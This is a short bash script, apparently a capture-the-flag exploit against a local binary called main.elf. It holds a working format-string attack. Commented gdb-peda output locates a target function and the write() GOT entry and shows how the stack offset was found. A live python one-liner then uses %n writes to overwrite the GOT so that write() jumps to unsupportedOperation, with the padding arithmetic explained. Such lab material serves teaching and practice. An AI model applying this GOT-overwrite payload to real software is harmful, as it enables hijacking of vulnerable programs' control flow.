#!/bin/bash

# Address of function unsupportedOperation: 0x080486eb
#gdb-peda$ disass unsupportedOperation 
#Dump of assembler code for function unsupportedOperation:
   #0x080486eb <+0>:	push   ebp

# Address of GOT_write: 0x804a028
#gdb-peda$ disass echoService 
#gdb-peda$ disass 0x8048570 (plt for write)
#Dump of assembler code for function write@plt:
   #0x08048570 <+0>:	jmp    DWORD PTR ds:0x804a028
   #0x08048576 <+6>:	push   0x38
   #0x0804857b <+11>:	jmp    0x80484f0
#End of assembler dump.


#python -c 'print "AAAABBBBCCCC" + "%08x "*6 + "%08x "*4 ' | ./main.elf
#AAAABBBBCCCC00000200 f77b45a0 ffdb1e54 f77fa000 f77def80 f76152e5 41414141 42424242 43434343 78383025 
#the buffer starts after 6 words:
#python -c 'print "AAAA " + "%7$x"' | ./main.elf
#AAAA 41414141


python -c 'print "\x28\xa0\x04\x08" + "\x2a\xa0\x04\x08" + "AAAA" + "%34527x" + "%7$n" + "%33049x" + "%8$n"' | ./main.elf


#math = 0x86eb => 34539 - (4+4+4) = 34527
	#0x10804 => 67588 - 34539 = 33049

#\x28\xa0\x04\x08 => write_GOT
#\x2a\xa0\x04\x08 => write_GOT + 2